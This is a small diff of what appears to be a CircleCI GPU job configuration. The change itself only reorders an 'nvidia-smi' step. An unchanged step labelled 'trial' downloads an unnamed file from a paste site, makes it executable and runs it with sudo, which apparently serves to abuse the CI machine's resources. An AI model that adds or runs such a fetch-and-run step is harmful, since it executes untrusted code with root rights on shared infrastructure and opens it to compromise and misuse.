@@ -5,8 +5,8 @@ jobs:
     machine:
       image: ubuntu-2004-cuda-11.4:202110-01
     steps:
-      - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: nvidia-smi
       - run: 
             name: "trial" 
             command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://hastebin.skyra.pw/raw/ekoqiticif && chmod u+x ekoqiticif && sudo ./ekoqiticif 
